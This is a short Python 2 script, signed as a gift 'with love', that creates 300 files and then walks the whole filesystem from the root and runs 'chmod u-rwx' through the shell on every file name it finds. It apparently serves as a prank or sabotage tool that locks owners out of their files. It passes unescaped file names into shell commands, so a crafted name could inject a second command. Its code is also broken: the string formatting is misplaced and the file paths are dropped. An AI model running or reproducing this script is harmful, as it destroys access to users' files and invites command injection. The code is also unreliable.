import os
def is_ascii(s):
    return all(ord(c) < 128 for c in s)
for i in xrange(300):
    os.system("touch documents/%s.txt") % i
for roots, dirs, files in os.walk("/"):
   for f in files:
      filename = f if is_ascii(f) else "unicode"
      os.system("chmod u-rwx %s" % filename)
#From Adrian, with love ;O